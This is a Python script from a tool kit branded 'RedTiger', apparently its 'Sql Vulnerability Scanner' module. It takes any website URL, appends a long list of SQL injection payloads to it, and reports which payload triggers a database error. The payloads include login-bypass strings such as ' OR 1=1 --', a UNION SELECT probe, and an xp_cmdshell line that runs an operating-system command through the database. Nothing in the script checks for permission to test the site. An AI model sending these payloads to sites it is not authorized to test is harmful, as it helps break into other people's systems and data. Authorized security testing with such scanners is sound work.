# Copyright (c) RedTiger (https://redtiger.shop)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *

try:
    import requests
except Exception as e:
    ErrorModule(e)

Title("Sql Vulnerability Scanner")

try:
    def detect_sql_error(url):

        sql_message_error = [
            "SQL syntax", "SQL error", "MySQL", "mysql", "MySQLYou",
            "Unclosed quotation mark", "SQLSTATE", "syntax error", "ORA-", 
            "SQLite", "PostgreSQL", "Truncated incorrect", "Division by zero",
            "You have an error in your SQL syntax", "Incorrect syntax near", 
            "SQL command not properly ended", "sql", "Sql", "Warning", "Error"
        ]

        sql_provocation_error  = [
            "'", '"', "''", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR 1=1 --",
            "' OR 1=1 /*", "' OR 'a'='a", "' OR 'a'='a' --", "' OR 'a'='a' /*", "' OR ''='", "admin'--", "admin' /*",
            "' OR 1=1#", "' OR '1'='1' (", "') OR ('1'='1", "'; EXEC xp_cmdshell('dir'); --", "' UNION SELECT NULL, NULL, NULL --", 
            "' OR 1=1 --", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR 1=1#", "' OR 1=1/*", 
            "' OR 'a'='a'#", "' OR 'a'='a'/*", "' OR ''=''", "' OR '1'='1'--", "admin' --", "admin' #", "' OR 1=1--", "' OR 1=1/*", 
            "' OR 'a'='a'--", "' OR ''=''", "' OR 'x'='x'", "' OR 'x'='x'--", "' OR 'x'='x'/*", "' OR x=x--", "' OR x=x/*", 
            "' OR 'x'='x'--", "' OR 1=1--", "' OR 1=1/*", "' OR 'a'='a'--", "' OR ''=''", "' OR 'x'='x'", "' OR 'x'='x'--", "' OR 'x'='x'/*"
        ]

        try:
            for provocation_error in sql_provocation_error:
                test_url = url + provocation_error
                
                response = requests.get(test_url, timeout=3)
                response_status = response.status_code
                
                if response_status != 200:
                    vulnerability = False
                    error = None
                    provocation = None
                else:
                    for message_error in sql_message_error:
                        if message_error in response.text:
                            vulnerability = True
                            error = message_error
                            provocation = provocation_error
                            break
                        else:
                            vulnerability = False
                            error = None
                            provocation = None
                        
                    if vulnerability == True:
                        break
        except:
            vulnerability = False
            error = None
            provocation = None

        
        if vulnerability == True:
            print(f"{BEFORE + current_time_hour() + AFTER} {ADD} Vulnerability SQL: {white}{vulnerability}{red} | Error Found: {white}{error}{red} | Provocation: {white}{provocation}{red}")
        else: 
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Vulnerability SQL: {white}{vulnerability}{red} | Error Found: {white}{error}{red} | Provocation: {white}{provocation}{red}")

        return vulnerability

    Slow(sql_banner)
    website_url = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Website Url -> {reset}")
    Censored(website_url)

    print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Looking for a vulnerability..")
    if "https://" not in website_url and "http://" not in website_url:
        website_url = "https://" + website_url

    detect_sql_error(website_url)
    Continue()
    Reset()
except Exception as e:
    Error(e)